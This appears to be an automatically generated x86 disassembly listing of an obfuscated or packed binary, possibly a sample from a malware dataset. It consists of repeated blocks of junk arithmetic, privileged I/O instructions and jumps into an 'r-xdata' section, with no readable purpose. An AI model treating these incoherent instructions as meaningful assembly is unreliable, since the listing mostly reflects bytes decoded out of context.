sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4030f7
add esp 0x4
jae r-xdata
push ecx
push ebx
push ecx
call sub_4031f4
xor ebx 0xff1a830f
jo 0x5596885a
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f8b21
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428ab9d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd03a4
jno r-xdata
jge 0xffffffffffa0b6e3
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403102
push esp
push edi
push esi
push ebp
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f8b21
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428ab9d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffd03a4
jno r-xdata
jge 0xffffffffffa0b6e3
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4031e5
jg r-xdata
jne r-xdata
and eax 0xae830f
add [ eax ] al
jae r-xdata
and esi 0x89641273
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
xor al [ ecx ]
add [ eax ] al
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c34090
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
or esi 0xff24810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jns r-xdata
sub ebx 0xe8525452
insb
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b682
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
add [ eax ] al
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jno r-xdata
and ebx 0x870f4975
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
xor esi 0xe681cd75
pop ecx
jne r-xdata
jbe 0xffd03a4
add esp 0x4
jae r-xdata
jl 0xf3b428
jno r-xdata
jge 0xffffffffffa0b6e3
pop eax
jg r-xdata
jge 0xffffffff894f8b21
add [ eax ] al
jge r-xdata
jpe 0x74cd42e7
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
ja r-xdata
and eax 0x4c48358
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jno r-xdata
jae 0xffffffff8428ab9d
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4031f4
jne r-xdata
add esp 0x8
jg 0xf44f683
jae r-xdata
ja 0xffffffffa3c34090
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb676
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_40325c
jb 0xffffffff81b2af12
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f8b21
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
jno r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428ab9d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db76f
